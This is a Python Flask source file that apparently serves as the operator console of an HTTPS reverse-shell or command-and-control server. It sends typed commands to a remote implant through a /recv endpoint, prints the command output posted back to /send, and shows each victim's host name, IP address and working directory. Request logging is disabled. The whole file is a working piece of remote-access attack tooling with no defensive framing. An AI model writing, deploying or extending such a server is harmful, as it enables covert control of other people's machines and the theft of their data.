import logging
from rich import print
from prompt_toolkit import prompt
from prompt_toolkit.styles import Style
from flask import (
    Flask,
    request,
    jsonify,
    url_for,
    redirect,
    Blueprint
)
log = logging.getLogger('werkzeug')
log.disabled = True
app = Flask(__name__)
errors = Blueprint('errors', __name__)
emptyresponse = ('', 204)

prompt_style = Style.from_dict(
    {
        'red': '#e50e0b',
        'blue': '#a926ed',
        'yellow': '#eded26'
    }
)

@app.errorhandler(403)
def error_403(e):
    return ('', 403)

@app.errorhandler(404)
def error_404(e):
    return redirect(url_for('Send'))

@app.errorhandler(500)
def internal_server_error(e):
    return redirect(url_for('Send'))

@app.route("/recv", methods=["GET"])
def Send():
    try:
        command = prompt(
            [
                ('class:blue', request.headers.get('Host-Name')),
                ('', '@'),
                ('class:blue', request.remote_addr),
                ('', ' :'),
                ('class:red', f"~{request.headers.get('Cwd')}"),
                ('', '> ')
            ],
            style=prompt_style
        )
    except KeyboardInterrupt:
        command = 'close'
    
    if command == "close":
        print('[bold blue][*][/] Ended session')
    return jsonify(
        {
            'Cmd': command
        }
    )

@app.route("/send", methods=["POST"])
def Recv():
    print(request.get_json()["Data"])
    return ('', 200)

app.run("0.0.0.0", 8000, debug=False, ssl_context=("Certs/server.crt", "Certs/server.key"))
        
